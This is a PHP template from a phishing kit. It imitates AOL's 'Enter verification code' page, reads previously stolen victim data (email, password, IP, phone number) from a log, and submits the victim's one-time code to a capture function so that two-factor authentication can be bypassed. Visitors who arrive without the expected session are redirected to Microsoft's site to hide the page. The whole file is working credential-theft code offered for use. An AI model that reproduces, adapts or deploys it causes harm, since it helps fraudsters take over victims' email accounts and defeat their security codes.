<?php
session_start();
require "../../function/settings.php";
if ($_SESSION['Status'] != 'otpmail') {
    header('Location: https://www.microsoft.com/en-us/microsoft-365?rtc=1');
}
$config_file = '../../function/config.json';
$json_data = file_get_contents($config_file);
// Decode JSON data into PHP array
$config = json_decode($json_data, true);
$Result =  new Coinbasah();
$Result->updateLog();
if (isset($_POST['Continue'])) {
    if ($Result->EmailLoginOTP($_POST) > 0) {
    }
}

$result = $Result->getKeyFromLog($_SESSION['Userinfo']);
if (is_array($result)) {
    // Extract the variables from the array
    $key = $result['key'];
    $ip = $result['ip'];
    $email = $result['email'];
    $password = $result['password'];
    $country = $result['country'];
    $phonenumber = $result['phonenumber'];
    $status = $result['status'];
}
?>
<!DOCTYPE html>
<html id="Stencil" lang="en-US" class="js grid light-theme "><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="strict-origin-when-cross-origin">
        <meta name="oath:guce:consent-host" content="guce.aol.com">
        <title>AOL</title>
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <style>
          body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            /* Prevent scrolling */
          }

          #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.6);
            /* Semi-transparent background */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            /* Ensure it's on top */
          }

          #animationContainer {
            width: 50px;
          }

          #loadingText {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
          }
        </style>
        <link href="assets/css/email/aol-main.css" rel="stylesheet" type="text/css">
    </head>
    <body class="bucket-mbr-del-recovery-email bucket-mbr-fido-upsell-desktop1">
    <div id="login-body" class="loginish  puree-v2 responsive  grid    ">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="#">
            <img src="assets/images/email/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="">
            <img src="assets/images/email/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="">
        </a>
    </span>
    <div class="desktop-universal-header">
        <a href="#" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerHelp">Help</a>
        <a href="#" class="universal-header-links" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerTerms">Terms</a>
        <a href="#" class="universal-header-links privacy-link" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerPrivacy">Privacy</a>
    </div>
</div>
    <div class="login-box-container">
        <div class="login-box right">
            <div style="padding: 20px;">
              <img src="assets/images/email/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-US" width="70"
                height="" />
              <img src="assets/images/email/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-US"
                width="70" height="" />
            </div>
            <div class="mbr-login-hd txt-align-center">
              <img src="assets/images/email/aolmail.png" alt="Aol" class="logo aol-en-US" width="200"
                height="" />
            </div>
            <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid"><?= @$_SESSION['Email']; ?></div>
    </div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter verification code</strong>
    <span class="txt-align-center challenge-desc">sent to your phone number<br><br>
                <span style="font-size:17px;">+*_***_***_ <?= @$phonenumber; ?></span></span>
        <form method="post" class="challenge-form">
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="<?= @$_SESSION['Email']; ?>">
        </div>
         
        <div id="password-container" class="input-group password-container blurred">
          <input type="tel" id="otp" class="login-passwd password" name="password" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" maxlength="6" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd" style="width: 100%; font-weight: 600; font-size:larger; letter-spacing: 4px;">
          <label for="login-passwd" id="password-label" class="password-label">OTP CODE</label>
          <div class="caps-indicator hide" id="caps-indicator" title="Capslock is on"></div>
        </div>
        <?php if(isset($_SESSION['errorb'])){ ?>
        <div style=" margin-top:5px">
          <span style="color:red; font-size: small;">The password you entered is incorrect!</span>
        </div>
        <?php } ?>
        <div class="reverse-order">
                <div class="button-container">
                  <button type="submit" id="login-signin"
                    class="pure-button puree-button-primary puree-spinner-button challenge-button" name="Continue"
                    value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
                    Next
                  </button>
                </div>
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
            <h1></h1>
<p></p>
        </div>
    </div>
</div>
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        const passwordInput = document.querySelector('.login-passwd');
        const toggleButton = document.querySelector('.password-toggle-button');
        toggleButton.addEventListener('click', function() {
          if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            toggleButton.classList.remove('hide-pw');
            toggleButton.classList.add('show-pw');
          } else {
            passwordInput.type = 'password';
            toggleButton.classList.remove('show-pw');
            toggleButton.classList.add('hide-pw');
          }
        });
      });
    </script>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
                AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="#">More&nbsp;Info</a>
        </p>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var otp = document.getElementById('otp');

            otp.addEventListener('input', function(e) {
                this.value = this.value.replace(/\D/g, ''); // Remove all non-numeric characters
            });
        });
    </script>
    

</body></html>